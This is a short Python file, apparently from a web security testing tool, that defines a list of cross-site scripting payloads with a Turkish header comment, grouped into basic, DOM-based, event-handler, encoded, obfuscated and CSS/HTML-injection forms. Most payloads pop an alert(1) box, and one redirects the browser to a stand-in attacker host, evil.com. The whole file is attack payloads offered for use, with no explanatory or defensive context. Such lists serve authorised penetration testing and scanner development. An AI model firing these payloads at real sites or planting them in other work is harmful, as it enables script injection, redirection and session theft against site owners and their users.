# xss_payloads.py

# Gelişmiş XSS Payload Seti
XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",

    # DOM-based
    "javascript:alert(1)",
    "'';document.location='http://evil.com'",
    "#<script>alert(1)</script>",

    # Event handlers
    "<body onload=alert(1)>",
    "<div onclick=alert(1)>Click</div>",

    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",

    # Obfuscated
    "<scr<script>ipt>alert(1)</scr</script>ipt>",

    # CSS/HTML Injection
    "<style>@import 'javascript:alert(1)'</style>",
    "<iframe src='javascript:alert(1)'>",
    "<math href='javascript:alert(1)'>",
    "<a href='javas&#99;ript:alert(1)'>click</a>"
]#
